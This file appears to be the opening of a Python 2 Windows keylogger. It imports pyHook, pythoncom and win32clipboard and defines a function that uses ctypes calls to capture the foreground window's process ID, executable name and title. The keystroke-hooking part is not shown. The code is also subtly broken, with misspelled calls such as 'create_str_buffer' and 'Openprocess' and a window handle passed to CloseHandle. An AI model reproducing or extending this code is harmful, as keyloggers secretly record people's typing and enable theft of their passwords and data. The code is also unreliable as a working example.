from ctypes import *
import pythoncom
import pyHook
import win32clipboard

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi

my_window = None

def get_current_process():
	handle = user32.GetForegroundWindow() # getting handle to foreground window

	# Get the PID
	pid = c_ulong(0)
	user32.GetWindowThreadProcessId(handle, byref(pid))

	# keeping PID 
	process_ID = "%d" % pid.value

	#Grabbing the executable
	exe = create_str_buffer("\x00" * 512)
	h_process = kernel32.Openprocess(0x400 | 0x10, False, pid)

	psapi.GetModuleBaseNameA(h_process,None,byref(exe),512)

	# reading title
	window_title = create_str_buffer("\x00" * 512)
	length = user32.GetWindowTextA(handle, byref(window_title),512)

	# printing header
	print "[PID: %s - %s - %s ]" % (process_ID, exe.value, window_title.value)

	# closing handle
	kernel32.CloseHandle(handle)
	kernel32.CloseHandle(h_process)